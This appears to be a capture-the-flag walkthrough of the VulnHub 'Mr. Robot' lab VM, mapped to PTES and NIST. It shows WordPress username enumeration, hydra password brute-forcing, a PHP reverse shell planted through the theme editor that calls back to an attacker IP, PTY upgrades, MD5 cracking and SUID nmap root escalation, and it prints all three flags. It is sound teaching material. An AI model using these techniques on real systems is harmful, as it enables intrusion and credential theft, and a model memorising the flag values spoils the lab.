# Mr. Robot CTF — Penetration Testing Handbook

> **Abstract:** This technical handbook provides a detailed, methodologically grounded account of a penetration test conducted against the vulnerable virtual machine **Mr. Robot**. The structure of the analysis strictly follows the **Penetration Testing Execution Standard (PTES)** and incorporates the guidance of **NIST SP 800-115**. The attack path covers, in sequence, passive and active information gathering (reconnaissance), resource enumeration, initial access, horizontal movement between user accounts (user pivoting), and, finally, vertical privilege escalation. Every action and technical command is analyzed on two interrelated levels: first, at the level of operating system behavior and network protocols; and second, at the level of tactical necessity — that is, clarifying how each piece of information unlocks the next stage of the attack chain (kill chain).

> - **Download:** [Mr Robot](https://www.vulnhub.com/entry/mr-robot-1,151/)
> - **English Writeup:** [Mr Robot CTF Walkthrough (2023)](https://medium.com/@cspanias/thms-mr-robot-ctf-walkthrough-2023-55ca5c19fbaf)
> - **Youtube Video:** [VulnHub: Mr Robot](https://www.youtube.com/watch?v=vKP-0i3II4Y)

---

## 1. Introduction and Methodological Framework

### 1.1 Scope and Objectives of the Exercise

The subject of this technical penetration test is a simulated attack against the **Mr. Robot** virtual machine. The primary purpose of the assessment is to identify, verify, and exploit a sequence of security weaknesses, with the ultimate goal of retrieving three unique control strings (**flags / keys**). 

Each key marks the successful attainment of a distinct level of authorization within the information system:

| Control Token | Required Access Level | Technical Proof and Operational Significance |
| :--- | :--- | :--- |
| **Key 1** | Anonymous External User (Unauthenticated Web Access) | Demonstrates that sensitive files and configuration data are exposed to the public internet without any authentication requirement. |
| **Key 2** | Local System User (`robot`) | Confirms the successful bypass of the application's authentication mechanisms and the ability to interact locally with the operating system. |
| **Key 3** | System Administrator (`root`) | Documents full system compromise, allowing every security mechanism to be bypassed entirely. |

The structure of the scenario highlights a fundamental principle of cybersecurity: the complete compromise of an infrastructure rarely results from a single, catastrophic vulnerability. Rather, it is usually the outcome of a chain of individual, seemingly insignificant misconfigurations whose successive exploitation defeats the system's defenses.

### 1.2 Standards and Methodological Approach (PTES / NIST)

The penetration test was conducted in accordance with the **Penetration Testing Execution Standard (PTES)**, ensuring professional consistency, reproducibility, and structured documentation. The sections of this document map directly to the official PTES phases:

```
[Intelligence Gathering] ──> [Threat Modelling] ──> [Vulnerability Analysis]
                                                              │
[Reporting] <── [Post-Exploitation] <── [Exploitation] <──────┘
```

| PTES Phase | Document Section | Operational Purpose and Deliverables |
| :--- | :--- | :--- |
| **Pre-engagement Interactions** | 1.1, 1.3 | Definition of the Rules of Engagement, scope, and legal framework. |
| **Intelligence Gathering** | 3.1, 3.2, 4.1 | Passive and active collection of information about the infrastructure, protocols, and services. |
| **Threat Modelling** | 2.0, 10.1 | Identification of potential attack vectors and prioritization of potential threats. |
| **Vulnerability Analysis** | 4.2, 5.2, 8.1 | Identification, validation, and correlation of software vulnerabilities and configuration errors. |
| **Exploitation** | 5.4, 5.5, 6.1 | Breach of security boundaries and acquisition of initial unauthorized control. |
| **Post-Exploitation** | 7.1, 7.3, 8.3 | Internal reconnaissance, horizontal movement (pivoting), privilege escalation, and preservation of evidence. |
| **Reporting** | 10.1, 10.2, 10.3 | Preparation of the technical report, risk assessment, and provision of remediation measures. |

In parallel, the document incorporates the distinctions drawn by the technical guide **NIST SP 800-115** (*Technical Guide to Information Security Testing and Assessment*), which clearly separates:
- **Passive Reconnaissance:** Collection of data by observing publicly available sources (e.g., inspection of HTML code, HTTP response headers) without generating unusual activity on the target's systems.
- **Active Reconnaissance:** Direct interaction with the target's network ports and services (e.g., port scanning, directory fuzzing) — activity that produces entries in log files and may be detected by IDS/IPS systems.

### 1.3 Assumptions, Constraints, and Test Environment

This test is subject to the following strict assumptions:
- **Legal Framework and Ethics:** All actions were carried out exclusively within an isolated, controlled laboratory environment with explicit prior authorization. Executing similar techniques against third-party infrastructure without a written agreement constitutes a serious criminal offense.
- **Attacker Machine:** The attack system runs a Linux environment (Kali Linux / Parrot OS) and has the following tools installed: `nmap`, `gobuster`, `hydra`, `netcat`, `john the ripper`, `hashcat`, as well as the Python 3 interpreter.
- **Target Notation:** The target's IP address is written as `<target-ip>` so that the commands can be readily adapted to any variant of the environment.
- **Tooling Constraints:** Wherever complex commercial or graphical tools are used (such as Burp Suite Professional or WPScan), equivalent solutions based on open-source command-line tools are provided.

### 1.4 Nomenclature and Terminology Conventions

To avoid misunderstanding and to ensure terminological precision, the established terms of the international cybersecurity literature (such as *Reconnaissance*, *Enumeration*, *Wordlist*, *Brute-Force*, *Hash*, *Salt*, *Rainbow Tables*, *Reverse Shell*, *Payload*, *PTY*, *SUID bit*, *EUID*, *Privilege Escalation*) are used in their standard English form. Complete conceptual definitions are provided in [Appendix A](#appendix-a-comprehensive-technical-glossary).

### 1.5 Documentation of Visual Evidence (Images)

All digital evidence (screenshots) is stored in the corresponding `images/` subdirectory and is numbered systematically (`img-02.png` through `img-31.png`, as well as `nmap-scan.png`). Each image is accompanied by a detailed caption explaining the technical findings and their evidentiary weight within the assessment.

---

## 2. Attack Chain Map (Attack Surface & Kill Chain)

The table below summarizes the flow of the attack, recording the transition from one stage to the next and highlighting the critical findings:

| Stage | Technical Action | Immediate Result | Critical Finding / Vulnerability |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | TCP Port Scanning (`nmap`) | Identification of open ports and Apache Server | Open ports `80/TCP` and `443/TCP` |
| **Enumeration** | Directory Fuzzing & analysis of `robots.txt` | Discovery of hidden files and CMS directories | Retrieval of **Key 1** & the `fsocity.dic` dictionary |
| **Data Processing** | Cleaning and deduplication of the wordlist | 98.7% reduction in the number of candidate passwords | Creation of the optimized `fs-list` list |
| **Credential Access** | Exploitation of CWE-204 & Brute-force | Discovery of valid administrator credentials | User: `elliot`, Password: `[REDACTED]` |
| **Initial Access** | Editing a WordPress Theme Template | Injection of PHP code for remote execution | Reverse Shell as user `daemon` |
| **User Pivoting** | Discovery of an MD5 hash and cryptanalysis | Recovery of a local account password | Switch to user `robot` & retrieval of **Key 2** |
| **Privilege Escalation**| Abuse of a SUID binary (`nmap`) | Execution of commands with elevated privileges | Full access as `root` & retrieval of **Key 3** |

This sequence demonstrates in practice that the security of a system is only as strong as its weakest link. Had even one of the individual protective measures functioned effectively (e.g., restricting access to `robots.txt`, disabling theme editing, or removing the SUID bit), the attack chain would have been broken.

### 2.1 Estimated Duration per Phase

In an isolated laboratory environment (Local/Lab Environment), the time required for each phase is estimated as follows:

| Test Phase | Estimated Time | Primary Slowdown / Delay Factor |
| :--- | :--- | :--- |
| **Reconnaissance** | 1 – 3 minutes | Probe rate & RTT |
| **Enumeration** | 5 – 15 minutes | Wordlist size and web server response speed |
| **Credentials** | 5 – 30 minutes | Number of concurrent threads & rate-limiting mechanisms |
| **Initial Access** | 5 – 10 minutes | Time to modify the payload and verify the listener |
| **User Pivoting** | 2 – 10 minutes | Hash complexity and cryptanalysis method (Lookup vs Brute-force) |
| **Privilege Escalation**| 2 – 5 minutes | Identification of insecure permissions in the file system |

> **Note on Operational Reality:** In real corporate production environments, the above times increase dramatically. Factors such as network latency, evasion of SIEM/EDR detection, the presence of aggressive Web Application Firewalls (WAF), and account lockout policies impose significantly more conservative execution rates.

---

## 3. Phase One: Reconnaissance and Network Mapping

### 3.1 Network Scanning Strategy and Execution

The penetration testing process necessarily begins with mapping the target's attack surface using the `nmap` tool. The scan aims to identify open TCP ports and extract the versions of the running services:

```bash
nmap <target-ip> -sV -T4 -oA nmap-scan -open
```

#### Technical Analysis of the Command Parameters

| Parameter | Functional Description | Technical and Methodological Purpose |
| :--- | :--- | :--- |
| `<target-ip>` | Target IPv4 Address | Defines the network destination endpoint to which the probe packets are sent. |
| `-sV` | Service Version Detection | Performs version detection by sending specialized probes and comparing the received banners with the `nmap-service-probes` database. Allows services to be correlated with known vulnerabilities (CVEs). |
| `-T4` | Timing Template (Aggressive) | Optimizes the timing parameters (reduced timeouts, faster packet retransmission). Suitable for stable, local laboratory networks. |
| `-oA nmap-scan` | Output in All Formats | Exports the results simultaneously in three file formats: normal text (`.nmap`), structured XML (`.xml`), and grepable format (`.gnmap`), ensuring a complete audit trail. |
| `-open` | Filter Open Ports Only | Filters the output, hiding ports in the `closed` or `filtered` state and allowing immediate focus on the actual targets. |

**Methodological Necessity:** Identifying open ports is the foundation of a penetration test. Without it, the attack surface cannot be determined, since every subsequent action depends directly on the services exposed to the network.

### 3.2 Analysis and Technical Assessment of the Results

The scan produced the following results:

```text
# Nmap 7.xx scan initiated
# Host is up (0.045s latency).
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

![Nmap scan results](../../06.%20Mr%20Robot/images/nmap-scan.png)

*Figure 1. Output of the Nmap command: only ports 80 and 443 (Apache httpd) are confirmed to be exposed.*

#### Technical Conclusions:
1. **Extremely Limited Attack Surface:** Of the 65,535 available TCP ports, only two are in the `listening` state.
2. **Absence of Conventional Management Services:** There is a complete absence of traditional remote access ports, such as SSH (`22/TCP`), Telnet (`23/TCP`), FTP (`21/TCP`), or RDP (`3389/TCP`). This means that attacks at the system administration level are ruled out from the outset.
3. **Focus on the Application Layer:** Any offensive maneuver must focus exclusively on the web server (Apache HTTP Server) and the web applications hosted on it.

### 3.3 Inspection of the Initial Web Interface

When browsing to `http://<target-ip>`, the server displays an interactive web page designed as a terminal emulator, with visual and thematic references to the Mr. Robot television series.

![Target home page](../../06.%20Mr%20Robot/images/img-02.png)

*Figure 2. The home page on port 80: a simulated command-line environment.*

The interface responds to specific commands (e.g., `help`, `join`, `fsociety`). Technically, however, it consists of static content based on JavaScript and HTML, with no meaningful interaction with underlying databases or authentication mechanisms.

A thorough source code review and inspection of the HTTP response headers revealed no sensitive developer comments, hidden paths, or credentials. This makes it clear that passive observation has reached its limits, requiring a transition to active resource enumeration techniques.

---

## 4. Phase Two: Web Enumeration and Resource Discovery

### 4.1 Directory Discovery Methods and Directory Brute-Force Architecture

To locate unpublished files and subdirectories on the web server, the high-speed tool `gobuster` is employed:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

#### Technical Analysis of the Command Parameters

| Parameter | Functional Description | Technical Purpose |
| :--- | :--- | :--- |
| `dir` | Directory Mode | Enables directory and file scanning mode through successive HTTP GET/HEAD requests. |
| `-u http://<target-ip>` | Base Target URL | Specifies the protocol, address, and root path of the web server. |
| `-w <wordlist>` | Wordlist Path | Specifies the dictionary file containing the candidate path names to be tested. |

#### Limitations and Factors of the Method:
- **Wordlist Quality:** If a critical path is not included in the wordlist used, the scan will fail to detect it.
- **HTTP Status Code Analysis:** 
  - Codes `200 OK` and `301/302 Redirect` confirm that the resource exists.
  - Code `403 Forbidden` indicates that the resource **exists**, but access is denied by permission settings (it should be recorded and investigated further).
  - Code `404 Not Found` indicates that the resource does not exist.

### 4.2 Assessment of Scan Results and CMS Architecture

![Gobuster results and login page](../../06.%20Mr%20Robot/images/img-03.png)

*Figure 3. Gobuster scan results and confirmation of the WordPress authentication page at the path `/wp-login`.*

The scan revealed numerous redirects (`301 Moved Permanently`) to standard paths of the **WordPress** platform:
- `/wp-content/`
- `/wp-includes/`
- `/wp-login.php` (or `/wp-login`)
- `/wp-admin/`

Identifying WordPress fundamentally changes the attack plan: the application is no longer treated as a simple static website, but is instead approached as a complex Content Management System (CMS) with specific attack vectors, such as plugins, themes, and authentication interfaces.

### 4.3 Exploiting robots.txt and Retrieving the First Key (Key 1)

A fundamental passive reconnaissance practice is the inspection of the `robots.txt` file. This file was created under the *Robots Exclusion Protocol* to instruct search engines as to which areas of a website should **not** be indexed. Frequently, however, administrators make the mistake of listing sensitive paths in it, wrongly assuming that non-indexing is equivalent to protection (Security through Obscurity).

![Contents of robots.txt](../../06.%20Mr%20Robot/images/img-04.png)

*Figure 4. The contents of the `robots.txt` file: two `Disallow` entries are identified.*

Examination of the file reveals two exclusion entries:
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The first key is retrieved immediately via a simple HTTP GET request, without the need for any software vulnerability:

```bash
curl -s http://<target-ip>/key-1-of-3.txt
```

```text
073403c8a58a1f80d943455fb30724b9
```

> **Finding 1 (Key 1):** `073403c8a58a1f80d943455fb30724b9`  
> **Vulnerability Classification:** Information Disclosure / Sensitive Data Exposure.

### 4.4 Identification and Analysis of the fsocity.dic File

The second entry in `robots.txt` points to the file `fsocity.dic`. This is a custom wordlist.

![Contents of the wordlist](../../06.%20Mr%20Robot/images/img-05.png)

*Figure 5. Preview of the first lines of the `fsocity.dic` file.*

The file is downloaded to the local workstation with the following command:

```bash
wget http://<target-ip>/fsocity.dic
```

The presence of a custom wordlist on the server itself is a very strong indication that the system's access credentials are directly related to the contents of this file.

---

## 5. Phase Three: Data Processing and Credential Extraction

### 5.1 Wordlist Optimization and Deduplication

An initial examination of `fsocity.dic` reveals a very large volume of data:

```bash
wc -l fsocity.dic
# 858160 fsocity.dic
```

The file contains **858,160 lines**. Using it directly in a network brute-force attack against WordPress would require an extremely long time and would place an excessive load on the server. 

A closer look at its contents reveals that the dictionary contains numerous identical, repeated entries. A deduplication step is therefore required.

Sorting and cleanup are performed with the following command:

```bash
sort -u fsocity.dic > fs-list
```

Alternatively, using a combination of UNIX commands:
```bash
sort fsocity.dic | uniq > fs-list
```

#### Technical Rationale:
The `uniq` command **strictly requires** prior sorting with `sort`, because it compares only adjacent lines. Without sorting, duplicate entries that are not next to each other would remain in the file.

Checking the new file:
```bash
wc -l fs-list
# 11451 fs-list
```

The number of candidates was reduced from 858,160 to **11,451 unique words** — a remarkable reduction of approximately **98.7%**, which turns an attack lasting many hours into a process of a few minutes.

### 5.2 Theory of User Enumeration via Observable Response Discrepancy (CWE-204)

The weakness **CWE-204 (Observable Response Discrepancy)** occurs when an application returns different responses depending on whether or not a username exists in its database. 

In older versions of WordPress, the authentication mechanism exhibits the following differences:
- **Non-existent Username:** The following error message is displayed:  
  `ERROR: Invalid username.`
- **Existing Username with an Incorrect Password:** The following error message is displayed:  
  `The password you entered for the username <user> is incorrect.`

This subtle difference allows an attacker to confirm which usernames are valid, completely separating the process of discovering users from the process of finding passwords.

### 5.3 Analysis and Capture of the Authentication Request

To configure the offensive tools correctly, a precise understanding of the HTTP authentication request is required.

![Error message for an invalid user](../../06.%20Mr%20Robot/images/img-06.jpg)

*Figure 6. Manual login test: the message "ERROR: Invalid username" is displayed.*

Using the Burp Suite Proxy, the HTTP POST request sent when the form is submitted is captured:

![Request capture via proxy](../../06.%20Mr%20Robot/images/img-07.png)

*Figure 7. Monitoring the HTTP POST request in Burp Suite Proxy.*

![Request parameters](../../06.%20Mr%20Robot/images/img-08.png)

*Figure 8. Inspection of the Request Body: identification of the `log` and `pwd` parameters.*

#### Analysis of the Request Elements:
- **Method:** `POST`
- **Endpoint:** `/wp-login.php`
- **Body Parameters:**
  - `log`: Contains the username.
  - `pwd`: Contains the password.
  - `wp-submit`: The submit action.

### 5.4 Confirmation of a Valid Username (Username Enumeration)

Using the `hydra` tool, the words in `fs-list` are tested automatically as candidate usernames while a fixed arbitrary password (`test`) is kept constant:

```bash
hydra -L fs-list -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

#### Technical Analysis of the Command Parameters

| Parameter | Technical Function |
| :--- | :--- |
| `-L fs-list` | Uses the `fs-list` list for the username position (`^USER^`). |
| `-p test` | Fixed password (`^PASS^`), so that only the existence of the user is tested. |
| `http-post-form` | HTTP POST form testing module. It consists of 3 parts separated by `:` <br>1. Path: `/wp-login.php`<br>2. Parameters: `log=^USER^&pwd=^PASS^`<br>3. Failure Condition: `F=Invalid username` |
| `-t 30` | Runs 30 parallel connection threads. |

![User enumeration result](../../06.%20Mr%20Robot/images/img-09.png)

*Figure 9. Hydra output: identification of the valid user `elliot`.*

Hydra detects that for the username **`elliot`**, the server did **not** return the string `Invalid username`, thereby confirming that the account exists.

### 5.5 Targeted Password Brute-Force Attack

With the username confirmed, a manual test is performed in the web interface to record the new error message:

![Error message for a valid user](../../06.%20Mr%20Robot/images/img-10.jpg)

*Figure 10. The differentiated error message: "The password you entered for the username elliot is incorrect".*

The failure condition is now adapted to the new message, and the attack is executed specifically against the user `elliot`:

```bash
hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

> **Critical Note on Hydra Syntax:** 
> - Lowercase `-l`: Specifies a **single, fixed** username.
> - Uppercase `-P`: Specifies a **list file** of passwords.

![Successful password recovery](../../06.%20Mr%20Robot/images/img-11.png)

*Figure 11. Successful recovery of the password for the `elliot` account.*

Hydra successfully completes the attack, revealing the credentials:
- **Username:** `elliot`
- **Password:** `ER28-0652`

### 5.6 Logging In and Exploring the Administration Panel

Logging in at `http://<target-ip>/wp-login.php` with the recovered credentials leads directly to the administration environment (WordPress Dashboard):

![WordPress administration panel](../../06.%20Mr%20Robot/images/img-12.png)

*Figure 12. Successful authentication: full access to the WordPress Dashboard as an administrator.*

The `elliot` account holds full administrator (`Administrator`) privileges. In WordPress, the Administrator role grants access to critical functions, such as installing plugins and modifying the source code of theme templates, providing ideal ground for code execution on the system.

---

## 6. Phase Four: Initial Access and System Foothold

### 6.1 Abuse of the Built-in Theme Editor for Remote Code Execution (RCE)

WordPress includes a built-in file editor (Theme File Editor) under `Appearance > Editor`. This feature allows administrators to modify the PHP files of installed themes directly.

![WordPress theme editor](../../06.%20Mr%20Robot/images/img-13.png)

*Figure 13. Navigating to the Theme Editor and selecting the `archive.php` template.*

The active theme (Twenty Fifteen) is selected, and a template file that is executed directly when requested, such as `archive.php` or `404.php`, is located. Replacing the contents of such a file with malicious PHP code leads to arbitrary command execution at the level of the underlying operating system.

### 6.2 Analysis of the Reverse Shell Payload Mechanism

To obtain an interactive shell, the widely recognized `php-reverse-shell` script (developed by pentestmonkey) is used.

![Reverse shell script](../../06.%20Mr%20Robot/images/img-14.png)

*Figure 14. The source code of the PHP Reverse Shell script.*

#### Internal Operation of the Reverse Shell:
1. The script initiates an outbound TCP connection via a socket to the attacker's IP address and port (`fsockopen`).
2. It creates a new system shell process (`/bin/sh`) using the `proc_open` function.
3. It redirects the standard data streams:
   - **`stdin` (Standard Input):** Reads commands directly from the network socket.
   - **`stdout` (Standard Output):** Sends command results back to the socket.
   - **`stderr` (Standard Error):** Sends error messages back to the socket.

> **Why a Reverse Shell and not a Bind Shell?**  
> In a *Bind Shell*, the target opens a port and waits for the attacker to connect. If the target is protected by a firewall or sits behind NAT, inbound connections are usually blocked. Conversely, in a *Reverse Shell*, it is the target that initiates the outbound connection to the attacker. Firewalls generally allow outbound traffic, which makes the reverse shell highly reliable.

![Script configuration](../../06.%20Mr%20Robot/images/img-15.png)

*Figure 15. Configuring the `$ip` and `$port` variables within the `archive.php` file.*

The variables are configured accordingly:
```php
$ip = '<attacker-ip>';  // The attack system's IP on the VPN network (e.g., tun0)
$port = 1234;           // The listening port on the attack system's workstation
```

The modified file is saved by clicking **Update File**.

### 6.3 Setting Up a Network Listener (Netcat Listener) and Execution

Before the payload is triggered, a listener is started locally using the `netcat` tool:

```bash
nc -lnvp 1234
```

#### Technical Analysis of the Netcat Flags:
- `-l` (Listen): Puts the tool into listening mode for incoming connections.
- `-n` (Numeric Only): Disables DNS name resolution, preventing delays and unnecessary network traffic.
- `-v` (Verbose): Displays detailed information about the connection status.
- `-p 1234` (Port): Specifies the listening port.

The code is triggered by visiting the corresponding path in a browser or with `curl`:

```bash
curl http://<target-ip>/wp-content/themes/twentyfifteen/archive.php
```

![Receiving the reverse shell](../../06.%20Mr%20Robot/images/img-16.png)

*Figure 16. Successful reverse shell connection: access to the system as a service user (`daemon`).*

The listener immediately accepts the connection, providing command-line access to the system with the privileges of the service user:
```bash
whoami
# daemon
```

---

## 7. Phase Five: User Pivoting and Horizontal Movement

### 7.1 Identification of Protected Resources and Analysis of File Permissions

As the `daemon` user, access to the system is highly restricted (low-privileged service account). The local users of the system must be identified by examining the `/home` directory:

```bash
ls -la /home
# drwxr-xr-x  3 root  root  4096 Nov 13  2015 .
# drwxr-xr-x 22 root  root  4096 Sep 16  2015 ..
# drwxr-xr-x  2 robot robot 4096 Nov 13  2015 robot
```

Inspecting the contents of the `/home/robot` directory:

```bash
ls -la /home/robot
```

![Files and permissions in the user's directory](../../06.%20Mr%20Robot/images/img-17.png)

*Figure 17. Contents of the `/home/robot` directory and analysis of the access permissions.*

#### Analysis of the Findings:
```text
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```

1. **`key-2-of-3.txt`:** The permissions are set to `-r--------` (0400). Only the file's owner (`robot`) has read permission. The `daemon` user is denied (`Permission denied`).
2. **`password.raw-md5`:** The permissions are set to `-rw-r--r--` (0644). Any user on the system can read its contents.

Reading the hash file:
```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

### 7.2 Weaknesses of the MD5 Algorithm and Cryptanalytic Password Recovery

The extracted hash corresponds to the **MD5 (Message Digest 5)** algorithm:
`c3fcd3d76192e4007dfb496cca67e13b`

#### Why MD5 Is Unsuitable for Password Storage:
1. **No Computational Cost (Work Factor):** MD5 was designed for fast data integrity checks, not for password storage. A modern computer can compute billions of MD5 hashes per second.
2. **No Salt:** The hash was stored without a salt (a random string appended before hashing). This means that the same password always produces exactly the same MD5 hash worldwide, making it immediately vulnerable to precomputed lookup tables (**Rainbow Tables**).

#### Comparative Table of Password Hashing Algorithms

| Algorithm | Computational Speed | Built-in Salt | Resistance to GPU/ASIC | Suitability for Password Hashing |
| :--- | :--- | :--- | :--- | :--- |
| **MD5** | Extremely High (ns) | No | None | **Dangerous / Obsolete** |
| **SHA-1 / SHA-256** | Very High | No | Very Low | **Unsuitable** (without a KDF) |
| **bcrypt** | Adjustable (Cost Factor) | Yes (128-bit) | High | **Acceptable / Secure** |
| **Argon2id** | Adjustable (Memory/CPU)| Yes | Maximum (Memory-Hard) | **Recommended (State-of-the-Art)** |

![Password recovery via an online database](../../06.%20Mr%20Robot/images/img-18.png)

*Figure 18. Immediate identification of the MD5 hash via an online database (CrackStation).*

Because no salt is used, submitting the hash to online lookup databases (e.g., CrackStation) immediately reveals the original plaintext:
- **MD5 Hash:** `c3fcd3d76192e4007dfb496cca67e13b`
- **Plaintext Password:** `abcdefghijklmnopqrstuvwxyz`

### 7.3 Upgrading the Shell to a Fully Interactive PTY and Retrieving Key 2

Now that the credentials of the `robot` user are known, a user switch is attempted with the `su robot` command:

![Failed user switch](../../06.%20Mr%20Robot/images/img-19.png)

*Figure 19. Failure of the `su` command: "su: must be run from a terminal".*

#### Technical Interpretation of the Problem:
The initial reverse shell obtained through PHP is attached directly to a plain data stream socket and **does not have a pseudo-terminal (PTY)**. The `su` command (like `sudo`, `passwd`, and `ssh`) strictly requires access to an interactive terminal in order to disable local echo (echo suppression) while the password is typed, preventing it from being displayed on screen.

#### Resolution via Python PTY Spawn:
To overcome this limitation, Python's built-in `pty` library is used to create a virtual terminal:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Alternative upgrade commands (when Python is not available):
```bash
# Using the script utility
script -qc /bin/bash /dev/null

# Using perl
perl -e 'exec "/bin/bash";'
```

Once the PTY has been created, the `su` command runs normally:
```bash
su robot
# Enter password: abcdefghijklmnopqrstuvwxyz
whoami
# robot
```

![Restored interactive shell](../../06.%20Mr%20Robot/images/img-20.png)

*Figure 20. Successful switch to the `robot` user and reading of the `key-2-of-3.txt` file.*

Now, as the `robot` user, reading the second key is possible:
```bash
cat /home/robot/key-2-of-3.txt
```

```text
822c73956184f694993bede3eb39f959
```

> **Finding 2 (Key 2):** `822c73956184f694993bede3eb39f959`  
> **Access Level:** Local System User (`robot`).

---

## 8. Phase Six: Privilege Escalation and Full Compromise

### 8.1 Searching for Executables with the SUID Bit Set

After successfully moving horizontally to the `robot` user, the next critical step is vertical **Privilege Escalation**, with the goal of obtaining superuser (`root`) privileges.

One of the most common escalation methods in Linux environments is identifying binary executables to which the **SUID (Set User ID) bit** has been mistakenly assigned.

#### Understanding the Special SUID Permission:
- In a normal executable, the process inherits the privileges of the user who runs it (Real User ID - RUID).
- When a file carries the **SUID bit** (`chmod u+s`), the process runs with the privileges of the **file's owner** (Effective User ID - EUID). If the owner is `root`, the executable runs with full administrative privileges, regardless of who invoked it.

Performing a system-wide search of the file system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Technical Analysis of the Command Parameters:
- `/`: Starts the search recursively from the root directory.
- `-perm -u=s` (or `-perm -4000`): Strictly filters for files that have the SUID bit set for the owner.
- `-type f`: Restricts the search exclusively to regular files (excluding directories and special device files).
- `2>/dev/null`: Redirects access error messages (Standard Error) to the null device, keeping the output clean.

![Search results](../../06.%20Mr%20Robot/images/img-21.png)

*Figure 21. List of executables with the SUID bit set: identification of `/usr/local/bin/nmap`.*

#### Assessment of the SUID Findings:
The command output lists typical system utilities that inherently require SUID (e.g., `/bin/ping`, `/usr/bin/passwd`, `/usr/bin/sudo`). However, one unusual binary stands out:
`/usr/local/bin/nmap`

Assigning SUID root permissions to such a powerful networking tool constitutes a very serious misconfiguration.

### 8.2 Analysis of Insecure Binaries (GTFOBins and the Nmap Binary)

The **GTFOBins** database systematically documents ways in which legitimate UNIX executables can be abused to bypass security restrictions and execute commands.

![Documentation of the technique](../../06.%20Mr%20Robot/images/img-22.png)

*Figure 22. Documentation of the shell escape technique for the `nmap` binary on GTFOBins.*

Checking the version of the installed nmap:
```bash
/usr/local/bin/nmap --version
# nmap version 3.81
```

Older versions of Nmap (specifically, versions 2.02 through 5.21) included a built-in interactive shell feature (**interactive mode**), which allows the user to execute system commands directly from within the tool's environment via the `!sh` escape command.

### 8.3 Executing the Escape Shell Technique and Obtaining Root Privileges

The exploitation proceeds as follows:

1. Launch the SUID binary in interactive mode:
```bash
/usr/local/bin/nmap --interactive
```

2. From within the Nmap environment, execute the escape command:
```text
nmap> !sh
```

#### Technical Interpretation of the Escalation:
Nmap runs with EUID `0` (`root`) because of the SUID bit. When the `!sh` command is invoked, the program calls the system function `system("/bin/sh")`. Because this older version does not drop privileges before the call, the new subshell (`sh`) fully inherits the superuser privileges (`EUID=0`).

![Obtaining a root shell](../../06.%20Mr%20Robot/images/img-23.png)

*Figure 23. Execution of the interactive escape shell and confirmation of root privileges.*

Confirming identity:
```bash
id
# uid=1002(robot) gid=1002(robot) euid=0(root) groups=1002(robot)
whoami
# root
```

### 8.4 Retrieving the Final Objective (Key 3)

With complete control over the operating system, navigating to the `/root` directory allows the third and final key to be retrieved:

```bash
cd /root
ls -la
cat key-3-of-3.txt
```

![Reading the final key](../../06.%20Mr%20Robot/images/img-24.png)

*Figure 24. Reading the final key from the `/root` directory.*

```text
04787ddef27c3dee1ee161b21670b4e4
```

> **Finding 3 (Key 3):** `04787ddef27c3dee1ee161b21670b4e4`  
> **Access Level:** Full System Administrator (`root`).

---

## 9. Alternative Techniques and Methodologies

In a comprehensive penetration test, the tester should be familiar with alternative methodological approaches for achieving the same result. Equivalent techniques that confirm the findings of the previous phases are presented below.

### 9.1 Automated Credential Attack Using Burp Suite Intruder

In addition to the `hydra` command-line tool, a brute-force attack against the WordPress authentication mechanism can be carried out using the **Burp Suite Intruder** module.

1. **Sending the Request:** The captured POST request is forwarded from the HTTP History to Intruder (`Ctrl + I`).

![Sending the request for automation](../../06.%20Mr%20Robot/images/img-25.png)

*Figure 25. Forwarding the `/wp-login.php` request to Burp Suite Intruder.*

2. **Defining Payload Positions:** The attack type is set to **Sniper** (for a single parameter), and markers (`§`) are placed around the password parameter: `pwd=§password§`.

![Defining payload positions](../../06.%20Mr%20Robot/images/img-26.png)

*Figure 26. Defining the `pwd` parameter as the payload insertion position.*

3. **Loading the Dictionary:** In the Payloads tab, the optimized `fs-list` list is loaded.

![Loading the wordlist](../../06.%20Mr%20Robot/images/img-27.jpg)

*Figure 27. Loading the processed `fs-list` dictionary.*

4. **Analysis of the Results:** During execution, the successful attempt is immediately distinguishable from the others, either by a change in the **HTTP Status Code** (`302 Found` instead of `200 OK`) or by a significant difference in the response size (**Length**).

![Analysis of the results](../../06.%20Mr%20Robot/images/img-28.png)

*Figure 28. Identification of the valid password based on the Status Code / Length discrepancy.*

### 9.2 Targeted Scanning and Brute-Force Using WPScan

**WPScan** is a specialized security assessment tool for WordPress that has built-in knowledge of the platform's architecture.

```bash
wpscan --url http://<target-ip> -t 50 -U elliot -P fs-list
```

#### Advantages over Hydra:
- Automatically identifies the authentication endpoints without manual configuration.
- Supports exploitation of the **XML-RPC** interface (`xmlrpc.php`), enabling the **system.multicall** technique, which tests hundreds of password combinations in a **single** HTTP request, thereby bypassing simple rate-limiting mechanisms.

![Successful attack via a specialized scanner](../../06.%20Mr%20Robot/images/img-29.png)

*Figure 29. Confirmation of the `elliot` user's credentials via WPScan.*

### 9.3 Local Hash Cracking with John the Ripper

The password stored in the `password.raw-md5` file can be recovered locally with **John the Ripper**, using the well-known `rockyou.txt` dictionary:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Password recovery via a dictionary tool](../../06.%20Mr%20Robot/images/img-30.png)

*Figure 30. Successful cracking of the MD5 hash with John the Ripper.*

### 9.4 Accelerated Recovery Using Graphics Cards (Hashcat GPGPU)

For high-complexity hashes, GPU acceleration (GPGPU computation) is the industry best practice. The **Hashcat** tool leverages the massive parallelism of graphics cards:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 0`: Specifies the hash type (0 = MD5).
- `-a 0`: Specifies a Straight Dictionary Attack.

![GPU acceleration](../../06.%20Mr%20Robot/images/img-31.png)

*Figure 31. Extremely fast completion of the cracking process using Hashcat.*

